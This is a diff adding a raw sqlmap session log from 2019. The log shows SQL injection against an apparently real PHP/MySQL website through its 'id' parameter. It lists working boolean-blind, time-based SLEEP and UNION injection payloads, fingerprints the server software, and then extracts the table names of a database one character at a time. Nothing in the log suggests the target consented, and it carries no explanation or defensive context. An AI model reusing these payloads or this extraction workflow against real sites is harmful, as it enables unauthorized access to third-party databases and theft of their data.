@@ -1,0 +1,1114 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.3.8.13#dev}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:12:52 /2019-08-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[22:12:52] [INFO] resuming back-end DBMS 'mysql' 
+[22:12:53] [INFO] testing connection to the target URL
+sqlmap got a 302 redirect to 'https://www.wsj.com/articles/trump-pursues-trade-deals-in-asia-europe-amid-frostiness-with-china-1537821235?mod=rss_asia_whats_news'. Do you want to follow? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=9868795 AND 1185=1185&l=1
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=9868795 AND (SELECT 4324 FROM (SELECT(SLEEP(5)))kAAS)&l=1
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=9868795 UNION ALL SELECT CONCAT(0x716a626a71,0x677452784572767a4c6d4744516a7449745a4665494442635866485973747066506f724d4961776b,0x716a6b7871),NULL,NULL-- XHTJ&l=1
+---
+[22:12:59] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8.0 (jessie)
+web application technology: PHP 5.6.30, PHP, Apache 2.4.10
+back-end DBMS: MySQL >= 5.0.12
+[22:12:59] [INFO] fetching tables for database: 'db398975_1'
+[22:13:00] [WARNING] the SQL query provided does not return any output
+[22:13:00] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[22:13:00] [WARNING] the SQL query provided does not return any output
+[22:13:00] [INFO] fetching number of tables for database 'db398975_1'
+[22:13:00] [INFO] resumed: 265
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 8
+[22:13:00] [INFO] resumed: 13user_1
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 8
+[22:13:00] [INFO] resumed: 1art_key
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 9
+[22:13:00] [INFO] resumed: 1art_text
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 9
+[22:13:00] [INFO] resumed: 0articles
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 11
+[22:13:00] [INFO] resumed: 1articles_1
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 11
+[22:13:00] [INFO] resumed: 1categories
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 16
+[22:13:00] [INFO] resumed: 1custom_sections
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 13
+[22:13:00] [INFO] resumed: 1custom_tiles
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 9
+[22:13:00] [INFO] resumed: 1fb_lists
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 15
+[22:13:00] [INFO] resumed: 1freeuser_tiles
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 12
+[22:13:00] [INFO] resumed: 1img_fbidden
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 5
+[22:13:00] [INFO] resumed: 1keyw
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 9
+[22:13:00] [INFO] resumed: 1keyw_evr
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 9
+[22:13:00] [INFO] resumed: 1keyw_sem
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 13
+[22:13:00] [INFO] resumed: 1list_sources
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 6
+[22:13:00] [INFO] resumed: 1lists
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 13
+[22:13:00] [INFO] resumed: 1main_sources
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 5
+[22:13:00] [INFO] resumed: 1news
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 9
+[22:13:00] [INFO] resumed: 1news_cat
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 9
+[22:13:00] [INFO] resumed: 1news_key
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 7
+[22:13:00] [INFO] resumed: 1q_user
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 14
+[22:13:00] [INFO] resumed: 1q_user_custom
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 17
+[22:13:00] [INFO] resumed: 1quser_similarity
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 7
+[22:13:00] [INFO] resumed: 1shares
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 8
+[22:13:00] [INFO] resumed: 1sources
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 17
+[22:13:00] [INFO] resumed: 1sources_inapp_ad
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 14
+[22:13:00] [INFO] resumed: 1sponsor_tiles
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 7
+[22:13:00] [INFO] resumed: 1user_1
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 7
+[22:13:00] [INFO] resumed: 1user_2
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 9
+[22:13:00] [INFO] resumed: 1user_cat
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 15
+[22:13:00] [INFO] resumed: 1user_lists_fol
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 13
+[22:13:00] [INFO] resumed: 1user_sources
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] resumed: 11
+[22:13:00] [INFO] resumed: 1user_tiles
+[22:13:00] [INFO] retrieving the length of query output
+[22:13:00] [INFO] retrieved: 8
+[22:13:21] [INFO] retrieved: ________[22:13:21] [INFO] retrieved: [22:13:41] [INFO] retrieved: _a______ 1/8 (12%)[22:13:44] [INFO] retrieved: 2a______ 2/8 (25%)[22:13:52] [INFO] retrieved: 2ar_____ 3/8 (37%)[22:13:58] [INFO] retrieved: 2art____ 4/8 (50%)[22:14:08] [INFO] retrieved: 2art_k__ 5/8 (62%)[22:14:09] [INFO] retrieved: 2art_ke_ 6/8 (75%)[22:14:14] [INFO] retrieved: 2art_key 7/8 (87%)[22:14:16] [INFO] retrieved: 2art_key           [22:14:16] [INFO] retrieved: 2art_key
+[22:14:16] [INFO] retrieving the length of query output
+[22:14:16] [INFO] retrieved: 9
+[22:14:25] [INFO] retrieved: _________[22:14:25] [INFO] retrieved: [22:14:45] [INFO] retrieved: _a_______ 1/9 (11%)[22:14:49] [INFO] retrieved: 2a_______ 2/9 (22%)[22:14:55] [INFO] retrieved: 2ar______ 3/9 (33%)[22:15:03] [INFO] retrieved: 2art_____ 4/9 (44%)[22:15:12] [INFO] retrieved: 2art__e__ 5/9 (55%)[22:15:18] [INFO] retrieved: 2art_te__ 6/9 (66%)[22:15:24] [INFO] retrieved: 2art_te__ 7/9 (77%)[22:15:29] [INFO] retrieved: 2art_tex_ 8/9 (88%)[22:15:31] [INFO] retrieved: 2art_text           [22:15:31] [INFO] retrieved: 2art_text
+[22:15:31] [INFO] retrieving the length of query output
+[22:15:31] [INFO] retrieved: 9
+[22:15:41] [INFO] retrieved: _________[22:15:41] [INFO] retrieved: [22:16:02] [INFO] retrieved: _a_______ 1/9 (11%)[22:16:04] [INFO] retrieved: 2a_______ 2/9 (22%)[22:16:10] [INFO] retrieved: 2ar______ 3/9 (33%)[22:16:17] [INFO] retrieved: 2art_____ 4/9 (44%)[22:16:19] [INFO] retrieved: 2arti____ 5/9 (55%)[22:16:19] [INFO] retrieved: 2artic___ 6/9 (66%)[22:16:30] [INFO] retrieved: 2artic_e_ 7/9 (77%)[22:16:32] [INFO] retrieved: 2article_ 8/9 (88%)[22:16:34] [INFO] retrieved: 2articles           [22:16:34] [INFO] retrieved: 2articles
+[22:16:34] [INFO] retrieving the length of query output
+[22:16:34] [INFO] retrieved: 11
+[22:16:43] [INFO] retrieved: ___________[22:16:43] [INFO] retrieved: [22:17:02] [INFO] retrieved: _a_________ 1/11 (9%)[22:17:07] [INFO] retrieved: 2a_________ 2/11 (18%)[22:17:14] [INFO] retrieved: 2ar________ 3/11 (27%)[22:17:18] [INFO] retrieved: 2ar_i______ 4/11 (36%)[22:17:19] [INFO] retrieved: 2arti______ 5/11 (45%)[22:17:23] [INFO] retrieved: 2artic_____ 6/11 (54%)[22:17:35] [INFO] retrieved: 2artic_e___ 7/11 (63%)[22:17:42] [INFO] retrieved: 2article___ 8/11 (72%)[22:17:42] [INFO] retrieved: 2articles__ 9/11 (81%)[22:17:45] [INFO] retrieved: 2articles_1 10/11 (90%)[22:17:50] [INFO] retrieved: 2articles_1             [22:17:50] [INFO] retrieved: 2articles_1
+[22:17:50] [INFO] retrieving the length of query output
+[22:17:50] [INFO] retrieved: 11
+[22:17:58] [INFO] retrieved: ___________[22:17:58] [INFO] retrieved: [22:18:19] [INFO] retrieved: __a________ 1/11 (9%)[22:18:23] [INFO] retrieved: _ca________ 2/11 (18%)[22:18:23] [INFO] retrieved: 2ca________ 3/11 (27%)[22:18:33] [INFO] retrieved: 2ca_e______ 4/11 (36%)[22:18:36] [INFO] retrieved: 2cate______ 5/11 (45%)[22:18:46] [INFO] retrieved: 2categ_____ 6/11 (54%)[22:18:51] [INFO] retrieved: 2catego____ 7/11 (63%)[22:18:53] [INFO] retrieved: 2catego_i__ 8/11 (72%)[22:18:53] [INFO] retrieved: 2categori__ 9/11 (81%)[22:18:58] [INFO] retrieved: 2categorie_ 10/11 (90%)[22:19:02] [INFO] retrieved: 2categories             [22:19:02] [INFO] retrieved: 2categories
+[22:19:02] [INFO] retrieving the length of query output
+[22:19:02] [INFO] retrieved: 16
+[22:19:14] [INFO] retrieved: ________________[22:19:14] [INFO] retrieved: [22:19:38] [INFO] retrieved: 2_______________ 1/16 (6%)[22:19:39] [INFO] retrieved: 2c______________ 2/16 (12%)[22:19:46] [INFO] retrieved: 2c_s____________ 3/16 (18%)[22:19:46] [INFO] retrieved: 2cus____________ 4/16 (25%)[22:20:08] [INFO] retrieved: 2cus_o__________ 5/16 (31%)[22:20:09] [INFO] retrieved: 2cus_om_________ 6/16 (37%)[22:20:17] [INFO] retrieved: 2custom_________ 7/16 (43%)[22:20:24] [INFO] retrieved: 2custom_________ 8/16 (50%)[22:20:26] [INFO] retrieved: 2custom__e______ 9/16 (56%)[22:20:27] [INFO] retrieved: 2custom_se______ 10/16 (62%)[22:20:34] [INFO] retrieved: 2custom_sec_____ 11/16 (68%)[22:20:43] [INFO] retrieved: 2custom_sec_i___ 12/16 (75%)[22:20:57] [INFO] retrieved: 2custom_secti___ 13/16 (81%)[22:20:57] [INFO] retrieved: 2custom_sectio__ 14/16 (87%)[22:21:01] [INFO] retrieved: 2custom_section_ 15/16 (93%)[22:21:02] [INFO] retrieved: 2custom_sections             [22:21:02] [INFO] retrieved: 2custom_sections
+[22:21:02] [INFO] retrieving the length of query output
+[22:21:02] [INFO] retrieved: 13
+[22:21:14] [INFO] retrieved: _____________[22:21:14] [INFO] retrieved: [22:21:36] [INFO] retrieved: 2____________ 1/13 (7%)[22:21:38] [INFO] retrieved: 2c___________ 2/13 (15%)[22:21:43] [INFO] retrieved: 2c_s_________ 3/13 (23%)[22:21:45] [INFO] retrieved: 2cus_________ 4/13 (30%)[22:22:01] [INFO] retrieved: 2cus__m______ 5/13 (38%)[22:22:08] [INFO] retrieved: 2cus_om______ 6/13 (46%)[22:22:21] [INFO] retrieved: 2custom______ 7/13 (53%)[22:22:25] [INFO] retrieved: 2custom__i___ 8/13 (61%)[22:22:29] [INFO] retrieved: 2custom_ti___ 9/13 (69%)[22:22:29] [INFO] retrieved: 2custom_ti___ 10/13 (76%)[22:22:36] [INFO] retrieved: 2custom_ti_e_ 11/13 (84%)[22:22:42] [INFO] retrieved: 2custom_tile_ 12/13 (92%)[22:22:44] [INFO] retrieved: 2custom_tiles             [22:22:44] [INFO] retrieved: 2custom_tiles
+[22:22:44] [INFO] retrieving the length of query output
+[22:22:44] [INFO] retrieved: 15
+[22:22:54] [INFO] retrieved: _______________[22:22:54] [INFO] retrieved: [22:23:18] [INFO] retrieved: 2______________ 1/15 (6%)[22:23:18] [INFO] retrieved: 2__e___________ 2/15 (13%)[22:23:19] [INFO] retrieved: 2_re___________ 3/15 (20%)[22:23:25] [INFO] retrieved: 2fre___________ 4/15 (26%)[22:23:40] [INFO] retrieved: 2fre_u_________ 5/15 (33%)[22:23:41] [INFO] retrieved: 2fre_us________ 6/15 (40%)[22:23:43] [INFO] retrieved: 2fre_use_______ 7/15 (46%)[22:23:55] [INFO] retrieved: 2freeuse_______ 8/15 (53%)[22:24:03] [INFO] retrieved: 2freeuser______ 9/15 (60%)[22:24:10] [INFO] retrieved: 2freeuser_t____ 10/15 (66%)[22:24:13] [INFO] retrieved: 2freeuser_ti___ 11/15 (73%)[22:24:25] [INFO] retrieved: 2freeuser_ti___ 12/15 (80%)[22:24:28] [INFO] retrieved: 2freeuser_ti_e_ 13/15 (86%)[22:24:29] [INFO] retrieved: 2freeuser_tile_ 14/15 (93%)[22:24:30] [INFO] retrieved: 2freeuser_tiles             [22:24:30] [INFO] retrieved: 2freeuser_tiles
+[22:24:30] [INFO] retrieving the length of query output
+[22:24:30] [INFO] retrieved: 12
+[22:24:42] [INFO] retrieved: ____________[22:24:42] [INFO] retrieved: [22:25:06] [INFO] retrieved: 2___________ 1/12 (8%)[22:25:08] [INFO] retrieved: 2i__________ 2/12 (16%)[22:25:13] [INFO] retrieved: 2i_g________ 3/12 (25%)[22:25:14] [INFO] retrieved: 2img________ 4/12 (33%)[22:25:29] [INFO] retrieved: 2img_f______ 5/12 (41%)[22:25:29] [INFO] retrieved: 2img_fb_____ 6/12 (50%)[22:25:32] [INFO] retrieved: 2img_fbi____ 7/12 (58%)[22:25:37] [INFO] retrieved: 2img_fbi____ 8/12 (66%)[22:25:48] [INFO] retrieved: 2img_fbi__e_ 9/12 (75%)[22:25:49] [INFO] retrieved: 2img_fbid_e_ 10/12 (83%)[22:25:51] [INFO] retrieved: 2img_fbidde_ 11/12 (91%)[22:25:54] [INFO] retrieved: 2img_fbidden             [22:25:54] [INFO] retrieved: 2img_fbidden
+[22:25:54] [INFO] retrieving the length of query output
+[22:25:54] [INFO] retrieved: 5
+[22:26:02] [INFO] retrieved: _____[22:26:02] [INFO] retrieved: [22:26:25] [INFO] retrieved: 2____ 1/5 (20%)[22:26:27] [INFO] retrieved: 2_e__ 2/5 (40%)[22:26:31] [INFO] retrieved: 2_ey_ 3/5 (60%)[22:26:31] [INFO] retrieved: 2key_ 4/5 (80%)[22:26:42] [INFO] retrieved: 2keyw           [22:26:42] [INFO] retrieved: 2keyw
+[22:26:42] [INFO] retrieving the length of query output
+[22:26:42] [INFO] retrieved: 9
+[22:26:51] [INFO] retrieved: _________[22:26:51] [INFO] retrieved: [22:27:16] [INFO] retrieved: 2________ 1/9 (11%)[22:27:16] [INFO] retrieved: 2_e______ 2/9 (22%)[22:27:19] [INFO] retrieved: 2_ey_____ 3/9 (33%)[22:27:22] [INFO] retrieved: 2key_____ 4/9 (44%)[22:27:38] [INFO] retrieved: 2key__s__ 5/9 (55%)[22:27:39] [INFO] retrieved: 2key__se_ 6/9 (66%)[22:27:48] [INFO] retrieved: 2keyw_se_ 7/9 (77%)[22:27:49] [INFO] retrieved: 2keyw_se_ 8/9 (88%)[22:27:51] [INFO] retrieved: 2keyw_sem           [22:27:51] [INFO] retrieved: 2keyw_sem
+[22:27:51] [INFO] retrieving the length of query output
+[22:27:51] [INFO] retrieved: 13
+[22:28:04] [INFO] retrieved: _____________[22:28:04] [INFO] retrieved: [22:28:28] [INFO] retrieved: 2____________ 1/13 (7%)[22:28:29] [INFO] retrieved: 2_i__________ 2/13 (15%)[22:28:36] [INFO] retrieved: 2_is_________ 3/13 (23%)[22:28:42] [INFO] retrieved: 2lis_________ 4/13 (30%)[22:28:57] [INFO] retrieved: 2lis__s______ 5/13 (38%)[22:29:09] [INFO] retrieved: 2list_s______ 6/13 (46%)[22:29:11] [INFO] retrieved: 2list_s______ 7/13 (53%)[22:29:11] [INFO] retrieved: 2list_so_____ 8/13 (61%)[22:29:20] [INFO] retrieved: 2list_sou____ 9/13 (69%)[22:29:28] [INFO] retrieved: 2list_sour___ 10/13 (76%)[22:29:29] [INFO] retrieved: 2list_sourc__ 11/13 (84%)[22:29:29] [INFO] retrieved: 2list_source_ 12/13 (92%)[22:29:34] [INFO] retrieved: 2list_sources             [22:29:34] [INFO] retrieved: 2list_sources
+[22:29:35] [INFO] retrieving the length of query output
+[22:29:35] [INFO] retrieved: 6
+[22:29:44] [INFO] retrieved: ______[22:29:44] [INFO] retrieved: [22:30:07] [INFO] retrieved: 2_____ 1/6 (16%)[22:30:09] [INFO] retrieved: 2_i___ 2/6 (33%)[22:30:15] [INFO] retrieved: 2_is__ 3/6 (50%)[22:30:19] [INFO] retrieved: 2lis__ 4/6 (66%)[22:30:25] [INFO] retrieved: 2lis_s 5/6 (83%)[22:30:31] [INFO] retrieved: 2lists           [22:30:32] [INFO] retrieved: 2lists
+[22:30:32] [INFO] retrieving the length of query output
+[22:30:32] [INFO] retrieved: 13
+[22:30:44] [INFO] retrieved: _____________[22:30:44] [INFO] retrieved: [22:31:04] [INFO] retrieved: __a__________ 1/13 (7%)[22:31:07] [INFO] retrieved: 2_a__________ 2/13 (15%)[22:31:09] [INFO] retrieved: 2_ai_________ 3/13 (23%)[22:31:15] [INFO] retrieved: 2mai_________ 4/13 (30%)[22:31:31] [INFO] retrieved: 2main________ 5/13 (38%)[22:31:31] [INFO] retrieved: 2main_s______ 6/13 (46%)[22:31:45] [INFO] retrieved: 2main_so_____ 7/13 (53%)[22:31:48] [INFO] retrieved: 2main_so_____ 8/13 (61%)[22:31:52] [INFO] retrieved: 2main_sou____ 9/13 (69%)[22:31:54] [INFO] retrieved: 2main_sour___ 10/13 (76%)[22:32:02] [INFO] retrieved: 2main_sourc__ 11/13 (84%)[22:32:02] [INFO] retrieved: 2main_source_ 12/13 (92%)[22:32:05] [INFO] retrieved: 2main_sources             [22:32:05] [INFO] retrieved: 2main_sources
+[22:32:05] [INFO] retrieving the length of query output
+[22:32:05] [INFO] retrieved: 5
+[22:32:13] [INFO] retrieved: _____[22:32:13] [INFO] retrieved: [22:32:36] [INFO] retrieved: 2____ 1/5 (20%)[22:32:38] [INFO] retrieved: 2_e__ 2/5 (40%)[22:32:44] [INFO] retrieved: 2_ew_ 3/5 (60%)[22:32:46] [INFO] retrieved: 2new_ 4/5 (80%)[22:32:54] [INFO] retrieved: 2news           [22:32:54] [INFO] retrieved: 2news
+[22:32:54] [INFO] retrieving the length of query output
+[22:32:54] [INFO] retrieved: 9
+[22:33:04] [INFO] retrieved: _________[22:33:04] [INFO] retrieved: [22:33:27] [INFO] retrieved: 2________ 1/9 (11%)[22:33:28] [INFO] retrieved: 2_e______ 2/9 (22%)[22:33:42] [INFO] retrieved: 2ne______ 3/9 (33%)[22:33:42] [INFO] retrieved: 2new_____ 4/9 (44%)[22:33:54] [INFO] retrieved: 2new___a_ 5/9 (55%)[22:34:00] [INFO] retrieved: 2new__ca_ 6/9 (66%)[22:34:02] [INFO] retrieved: 2news_ca_ 7/9 (77%)[22:34:05] [INFO] retrieved: 2news_ca_ 8/9 (88%)[22:34:10] [INFO] retrieved: 2news_cat           [22:34:10] [INFO] retrieved: 2news_cat
+[22:34:10] [INFO] retrieving the length of query output
+[22:34:10] [INFO] retrieved: 9
+[22:34:19] [INFO] retrieved: _________[22:34:19] [INFO] retrieved: [22:34:43] [INFO] retrieved: 2________ 1/9 (11%)[22:34:44] [INFO] retrieved: 2_e______ 2/9 (22%)[22:34:58] [INFO] retrieved: 2_ew_____ 3/9 (33%)[22:34:58] [INFO] retrieved: 2new_____ 4/9 (44%)[22:35:15] [INFO] retrieved: 2new___e_ 5/9 (55%)[22:35:22] [INFO] retrieved: 2news__e_ 6/9 (66%)[22:35:22] [INFO] retrieved: 2news_ke_ 7/9 (77%)[22:35:24] [INFO] retrieved: 2news_ke_ 8/9 (88%)[22:35:28] [INFO] retrieved: 2news_key           [22:35:28] [INFO] retrieved: 2news_key
+[22:35:28] [INFO] retrieving the length of query output
+[22:35:28] [INFO] retrieved: 7
+[22:35:36] [INFO] retrieved: _______[22:35:36] [INFO] retrieved: [22:35:56] [INFO] retrieved: ___a___ 1/7 (14%)[22:36:00] [INFO] retrieved: 2__a___ 2/7 (28%)[22:36:08] [INFO] retrieved: 2s_a___ 3/7 (42%)[22:36:10] [INFO] retrieved: 2sha___ 4/7 (57%)[22:36:15] [INFO] retrieved: 2sha_e_ 5/7 (71%)[22:36:16] [INFO] retrieved: 2share_ 6/7 (85%)[22:36:20] [INFO] retrieved: 2shares           [22:36:20] [INFO] retrieved: 2shares
+[22:36:20] [INFO] retrieving the length of query output
+[22:36:20] [INFO] retrieved: 8
+[22:36:29] [INFO] retrieved: ________[22:36:29] [INFO] retrieved: [22:36:52] [INFO] retrieved: 2_______ 1/8 (12%)[22:37:01] [INFO] retrieved: 2s______ 2/8 (25%)[22:37:01] [INFO] retrieved: 2s_u____ 3/8 (37%)[22:37:04] [INFO] retrieved: 2sou____ 4/8 (50%)[22:37:18] [INFO] retrieved: 2sou__e_ 5/8 (62%)[22:37:18] [INFO] retrieved: 2sou_ce_ 6/8 (75%)[22:37:22] [INFO] retrieved: 2source_ 7/8 (87%)[22:37:23] [INFO] retrieved: 2sources           [22:37:23] [INFO] retrieved: 2sources
+[22:37:23] [INFO] retrieving the length of query output
+[22:37:23] [INFO] retrieved: 17
+[22:37:33] [INFO] retrieved: _________________[22:37:33] [INFO] retrieved: [22:37:57] [INFO] retrieved: 2________________ 1/17 (5%)[22:38:04] [INFO] retrieved: 2s_______________ 2/17 (11%)[22:38:06] [INFO] retrieved: 2s_u_____________ 3/17 (17%)[22:38:11] [INFO] retrieved: 2sou_____________ 4/17 (23%)[22:38:22] [INFO] retrieved: 2sou_c___________ 5/17 (29%)[22:38:22] [INFO] retrieved: 2sou_ce__________ 6/17 (35%)[22:38:33] [INFO] retrieved: 2source__________ 7/17 (41%)[22:38:34] [INFO] retrieved: 2sources_________ 8/17 (47%)[22:38:38] [INFO] retrieved: 2sources_i_______ 9/17 (52%)[22:38:45] [INFO] retrieved: 2sources_i_a_____ 10/17 (58%)[22:39:02] [INFO] retrieved: 2sources_ina_____ 11/17 (64%)[22:39:03] [INFO] retrieved: 2sources_ina_____ 12/17 (70%)[22:39:09] [INFO] retrieved: 2sources_inap____ 13/17 (76%)[22:39:15] [INFO] retrieved: 2sources_inap__a_ 14/17 (82%)[22:39:18] [INFO] retrieved: 2sources_inapp_a_ 15/17 (88%)[22:39:24] [INFO] retrieved: 2sources_inapp_ad 16/17 (94%)[22:39:27] [INFO] retrieved: 2sources_inapp_ad             [22:39:27] [INFO] retrieved: 2sources_inapp_ad
+[22:39:27] [INFO] retrieving the length of query output
+[22:39:27] [INFO] retrieved: 14
+[22:39:37] [INFO] retrieved: ______________[22:39:37] [INFO] retrieved: [22:40:00] [INFO] retrieved: 2_____________ 1/14 (7%)[22:40:09] [INFO] retrieved: 2s____________ 2/14 (14%)[22:40:15] [INFO] retrieved: 2s_o__________ 3/14 (21%)[22:40:22] [INFO] retrieved: 2spo__________ 4/14 (28%)[22:40:31] [INFO] retrieved: 2spon_________ 5/14 (35%)[22:40:32] [INFO] retrieved: 2spons________ 6/14 (42%)[22:40:43] [INFO] retrieved: 2spons_r______ 7/14 (50%)[22:40:45] [INFO] retrieved: 2sponsor______ 8/14 (57%)[22:41:01] [INFO] retrieved: 2sponsor__i___ 9/14 (64%)[22:41:01] [INFO] retrieved: 2sponsor_ti___ 10/14 (71%)[22:41:10] [INFO] retrieved: 2sponsor_ti___ 11/14 (78%)[22:41:14] [INFO] retrieved: 2sponsor_til__ 12/14 (85%)[22:41:16] [INFO] retrieved: 2sponsor_tile_ 13/14 (92%)[22:41:18] [INFO] retrieved: 2sponsor_tiles             [22:41:18] [INFO] retrieved: 2sponsor_tiles
+[22:41:18] [INFO] retrieving the length of query output
+[22:41:18] [INFO] retrieved: 7
+[22:41:26] [INFO] retrieved: _______[22:41:26] [INFO] retrieved: [22:41:49] [INFO] retrieved: 2______ 1/7 (14%)[22:41:50] [INFO] retrieved: 2__e___ 2/7 (28%)[22:41:57] [INFO] retrieved: 2_se___ 3/7 (42%)[22:41:57] [INFO] retrieved: 2use___ 4/7 (57%)[22:42:06] [INFO] retrieved: 2use__1 5/7 (71%)[22:42:15] [INFO] retrieved: 2user_1 6/7 (85%)[22:42:17] [INFO] retrieved: 2user_1           [22:42:17] [INFO] retrieved: 2user_1
+[22:42:17] [INFO] retrieving the length of query output
+[22:42:17] [INFO] retrieved: 7
+[22:42:24] [INFO] retrieved: _______[22:42:24] [INFO] retrieved: [22:42:47] [INFO] retrieved: 2______ 1/7 (14%)[22:42:49] [INFO] retrieved: 2__e___ 2/7 (28%)[22:42:55] [INFO] retrieved: 2_se___ 3/7 (42%)[22:42:57] [INFO] retrieved: 2use___ 4/7 (57%)[22:43:11] [INFO] retrieved: 2use__2 5/7 (71%)[22:43:15] [INFO] retrieved: 2user_2 6/7 (85%)[22:43:17] [INFO] retrieved: 2user_2           [22:43:17] [INFO] retrieved: 2user_2
+[22:43:17] [INFO] retrieving the length of query output
+[22:43:17] [INFO] retrieved: 9
+[22:43:27] [INFO] retrieved: _________[22:43:27] [INFO] retrieved: [22:43:51] [INFO] retrieved: 2________ 1/9 (11%)[22:43:51] [INFO] retrieved: 2__e_____ 2/9 (22%)[22:43:58] [INFO] retrieved: 2_se_____ 3/9 (33%)[22:43:59] [INFO] retrieved: 2use_____ 4/9 (44%)[22:44:11] [INFO] retrieved: 2use___a_ 5/9 (55%)[22:44:13] [INFO] retrieved: 2use__ca_ 6/9 (66%)[22:44:22] [INFO] retrieved: 2user_ca_ 7/9 (77%)[22:44:25] [INFO] retrieved: 2user_ca_ 8/9 (88%)[22:44:28] [INFO] retrieved: 2user_cat           [22:44:28] [INFO] retrieved: 2user_cat
+[22:44:28] [INFO] retrieving the length of query output
+[22:44:28] [INFO] retrieved: 15
+[22:44:39] [INFO] retrieved: _______________[22:44:39] [INFO] retrieved: [22:45:04] [INFO] retrieved: ___e___________ 1/15 (6%)[22:45:04] [INFO] retrieved: 2__e___________ 2/15 (13%)[22:45:09] [INFO] retrieved: 2u_e___________ 3/15 (20%)[22:45:10] [INFO] retrieved: 2use___________ 4/15 (26%)[22:45:25] [INFO] retrieved: 2user__________ 5/15 (33%)[22:45:28] [INFO] retrieved: 2user__i_______ 6/15 (40%)[22:45:38] [INFO] retrieved: 2user_li_______ 7/15 (46%)[22:45:45] [INFO] retrieved: 2user_li_______ 8/15 (53%)[22:45:50] [INFO] retrieved: 2user_lis______ 9/15 (60%)[22:45:56] [INFO] retrieved: 2user_list_____ 10/15 (66%)[22:45:58] [INFO] retrieved: 2user_lists____ 11/15 (73%)[22:46:12] [INFO] retrieved: 2user_lists_f__ 12/15 (80%)[22:46:22] [INFO] retrieved: 2user_lists_fo_ 13/15 (86%)[22:46:22] [INFO] retrieved: 2user_lists_fol 14/15 (93%)[22:46:22] [INFO] retrieved: 2user_lists_fol             [22:46:22] [INFO] retrieved: 2user_lists_fol
+[22:46:22] [INFO] retrieving the length of query output
+[22:46:22] [INFO] retrieved: 13
+[22:46:35] [INFO] retrieved: _____________[22:46:35] [INFO] retrieved: [22:46:59] [INFO] retrieved: 2____________ 1/13 (7%)[22:47:00] [INFO] retrieved: 2__e_________ 2/13 (15%)[22:47:07] [INFO] retrieved: 2u_e_________ 3/13 (23%)[22:47:07] [INFO] retrieved: 2use_________ 4/13 (30%)[22:47:31] [INFO] retrieved: 2use__s______ 5/13 (38%)[22:47:37] [INFO] retrieved: 2user_s______ 6/13 (46%)[22:47:37] [INFO] retrieved: 2user_so_____ 7/13 (53%)[22:47:45] [INFO] retrieved: 2user_so_____ 8/13 (61%)[22:47:54] [INFO] retrieved: 2user_so__c__ 9/13 (69%)[22:47:54] [INFO] retrieved: 2user_sou_c__ 10/13 (76%)[22:47:59] [INFO] retrieved: 2user_sourc__ 11/13 (84%)[22:48:00] [INFO] retrieved: 2user_source_ 12/13 (92%)[22:48:06] [INFO] retrieved: 2user_sources             [22:48:06] [INFO] retrieved: 2user_sources
+[22:48:06] [INFO] retrieving the length of query output
+[22:48:06] [INFO] retrieved: 11
